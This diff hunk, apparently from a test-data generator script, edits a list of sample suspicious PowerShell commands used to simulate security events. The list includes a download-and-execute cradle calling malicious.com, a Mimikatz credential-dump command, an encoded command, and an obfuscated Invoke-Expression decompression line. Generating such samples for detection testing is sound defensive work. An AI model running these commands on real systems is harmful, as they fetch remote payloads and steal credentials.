@@ -118,7 +118,7 @@ generate_powershell_suspicious_event() {
         "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
         "Invoke-Mimikatz -DumpCreds"
         "powershell -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
-        "Invoke-Expression \\\$(New-Object IO.StreamReader (\\\$(New-Object IO.Compression.DeflateStream"
+        'Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ([IO.MemoryStream]::new(),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
     )
     local script="${script_blocks[$((RANDOM % ${#script_blocks[@]}))]}"
 
